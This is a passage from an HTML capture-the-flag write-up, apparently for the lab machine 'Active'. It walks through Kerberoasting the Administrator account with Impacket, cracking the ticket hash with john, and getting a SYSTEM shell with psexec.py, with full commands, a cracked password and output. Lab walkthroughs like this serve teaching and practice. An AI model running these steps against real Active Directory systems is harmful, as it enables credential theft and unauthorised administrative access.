                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#GetUserSPNs.py&nbsp;active.htb/SVC_TGS:GPPstillStandingStrong2k18</span><br>
                Impacket&nbsp;v0.9.21-dev&nbsp;-&nbsp;Copyright&nbsp;2019&nbsp;SecureAuth&nbsp;Corporation<br>
                <br>
                ServicePrincipalName&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MemberOf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PasswordLastSet&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastLogon&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
                --------------------&nbsp;&nbsp;-------------&nbsp;&nbsp;--------------------------------------------------------&nbsp;&nbsp;--------------------------&nbsp;&nbsp;--------------------------<br>
                active<span style="color:#ff9d00;font-weight:700">/</span>CIFS<span style="color:#ff9d00;font-weight:700">:</span>445&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Administrator&nbsp;&nbsp;CN=Group&nbsp;Policy&nbsp;Creator&nbsp;Owners,CN=Users,DC=active,DC=htb&nbsp;&nbsp;2018-07-18&nbsp;20<span style="color:#ff9d00;font-weight:700">:</span>06<span style="color:#ff9d00;font-weight:700">:</span>40.351723&nbsp;&nbsp;2018-07-30&nbsp;18<span style="color:#ff9d00;font-weight:700">:</span>17<span style="color:#ff9d00;font-weight:700">:</span>40.656520&nbsp;
            </div>
        </div><br>
        <br>
        Ah, Administrator has been configured with an SPN.<br>
        This means we can perform a Kerberoasting attack.<br>
        <br>
        <strong>What is Kerberoasting?</strong><br>
        Kerberoasting is where you make a TGS request to the Domain Controller to request access to another service running on the network (e.g. MSSQL). The Domain Controller will then reply. This reply is encrypted with NTLM hash of the user running the service. We then extract the password hash from the reply and crack it, ending up with a set of credentials.<br>
        <br>
        Fortunately, Impacket's <code>GetUserSPNs.py</code> can do this all for us.<br>
        Make a TGS request with <code>GetUserSPNs.py</code> and the <code>-request</code> flag, and <code>GetUserSPNs.py</code> will extract the password hash from the response for us.<br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active<span style="color:#ff9d00;font-weight:700">/</span>ldap]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#GetUserSPNs.py&nbsp;-request&nbsp;active.htb/SVC_TGS:GPPstillStandingStrong2k18</span><br>
                Impacket&nbsp;v0.9.21-dev&nbsp;-&nbsp;Copyright&nbsp;2019&nbsp;SecureAuth&nbsp;Corporation<br>
                <br>
                ServicePrincipalName&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MemberOf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PasswordLastSet&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastLogon&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
                --------------------&nbsp;&nbsp;-------------&nbsp;&nbsp;--------------------------------------------------------&nbsp;&nbsp;--------------------------&nbsp;&nbsp;--------------------------<br>
                active<span style="color:#ff9d00;font-weight:700">/</span>CIFS<span style="color:#ff9d00;font-weight:700">:</span>445&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Administrator&nbsp;&nbsp;CN=Group&nbsp;Policy&nbsp;Creator&nbsp;Owners,CN=Users,DC=active,DC=htb&nbsp;&nbsp;2018-07-18&nbsp;20<span style="color:#ff9d00;font-weight:700">:</span>06<span style="color:#ff9d00;font-weight:700">:</span>40.351723&nbsp;&nbsp;2018-07-30&nbsp;18<span style="color:#ff9d00;font-weight:700">:</span>17<span style="color:#ff9d00;font-weight:700">:</span>40.656520&nbsp;<br>
                <br>
                <span style="color:#7f0044;font-weight:400">$krb5tgs$23$*Administrator$ACTIVE</span>.HTB<span style="color:#7f0044;font-weight:400">$active</span><span style="color:#ff9d00;font-weight:700">/</span>CIFS~445*<span style="color:#7f0044;font-weight:400">$1b0d06d6948d3b681cb13acf1a57cc54$74d5ce0ce62879a109a5afeaa49247c</span><br>
                [...]
            </div>
        </div><br>
        <br>
        <code>Administrator</code>'s password hash can be cracked with <code>john</code>.<br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active<span style="color:#ff9d00;font-weight:700">/</span>ldap]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;tgs.hash</span><br>
                <span style="color:#ff9d00;font-weight:700">(</span>copy<span style="color:#ff9d00;font-weight:700">/</span>paste&nbsp;<span style="color:#ff9d00;font-weight:700">hash</span>&nbsp;into&nbsp;<span style="color:#ff9d00;font-weight:700">file)</span><br>
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active<span style="color:#ff9d00;font-weight:700">/</span>ldap]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#john&nbsp;--wordlist=/usr/share/wordlists/rockyou.txt&nbsp;tgs.hash</span><br>
                Using&nbsp;default&nbsp;input&nbsp;encoding<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;UTF-8<br>
                Loaded&nbsp;1&nbsp;password&nbsp;<span style="color:#ff9d00;font-weight:700">hash</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>krb5tgs,&nbsp;Kerberos&nbsp;5&nbsp;TGS&nbsp;etype&nbsp;23&nbsp;[MD4&nbsp;HMAC-MD5&nbsp;RC4]<span style="color:#ff9d00;font-weight:700">)</span><br>
                Will&nbsp;run&nbsp;2&nbsp;OpenMP&nbsp;threads<br>
                Press&nbsp;<span style="color:#3ad900;font-weight:400">'q'</span>&nbsp;or&nbsp;Ctrl-C&nbsp;to&nbsp;abort,&nbsp;almost&nbsp;any&nbsp;other&nbsp;key&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">status</span><br>
                Ticketmaster1968&nbsp;(?)<br>
                1g&nbsp;0:00:00:10&nbsp;DONE&nbsp;(2019-11-04&nbsp;11:21)&nbsp;0.09881g/s&nbsp;1041Kp/s&nbsp;1041Kc/s&nbsp;1041KC/s&nbsp;Tiffani1432..Tiago_18
            </div>
        </div><br>
        <br>
        We now have Administrator's credentials:<br>
        <code>Administrator / Ticketmaster1968</code><br>
        <br>
        <a id="h1-2" name="h1-2"></a><strong></strong>
        <h1><strong>Gain Access as Administrator</strong></h1>
        <br>
        <a id="h2-5" name="h2-5"></a><strong></strong>
        <h2><strong>5) psexec.py</strong></h2><br>
        Wtih Administrator's credentials we can get a shell on the system, because SMB is running, using Impacket's <code>psexec.py</code>.<br>
            <div class="codebox">
                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active<span style="color:#ff9d00;font-weight:700">/</span>ldap]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#psexec.py&nbsp;active.htb/Administrator:Ticketmaster1968@10.10.10.100</span><br>
                Impacket&nbsp;v0.9.21-dev&nbsp;-&nbsp;Copyright&nbsp;2019&nbsp;SecureAuth&nbsp;Corporation<br>
                <br>
                [*]&nbsp;Requesting&nbsp;shares&nbsp;on&nbsp;10.10.10.100.....<br>
                [*]&nbsp;Found&nbsp;writable&nbsp;share&nbsp;ADMIN$<br>
                [*]&nbsp;Uploading&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;oSVZzfrN.exe<br>
                [*]&nbsp;Opening&nbsp;SVCManager&nbsp;on&nbsp;10.10.10.100.....<br>
                [*]&nbsp;Creating&nbsp;service&nbsp;UJmE&nbsp;on&nbsp;10.10.10.100.....<br>
                [*]&nbsp;Starting&nbsp;service&nbsp;UJmE.....<br>
                [<span style="color:#ff9d00;font-weight:700">!</span>]&nbsp;Press&nbsp;<span style="color:#ff9d00;font-weight:700">help</span>&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">extra</span>&nbsp;shell&nbsp;commands<br>
                Microsoft&nbsp;Windows&nbsp;[Version&nbsp;6.1.7601]<br>
                Copyright&nbsp;(c)&nbsp;2009&nbsp;Microsoft&nbsp;Corporation.&nbsp;&nbsp;All&nbsp;rights&nbsp;reserved.<br>
                <br>
                C:\Windows\system32&gt;whoami<br>
                nt&nbsp;authority\system<br>
                <br>
                C:\Windows\system32&gt;type&nbsp;C:\Users\Administrator\Desktop\root.txt<br>
                b5fc76d1d6...
            </div>
        </div>
    </writeup>
</section>

</body>
</html>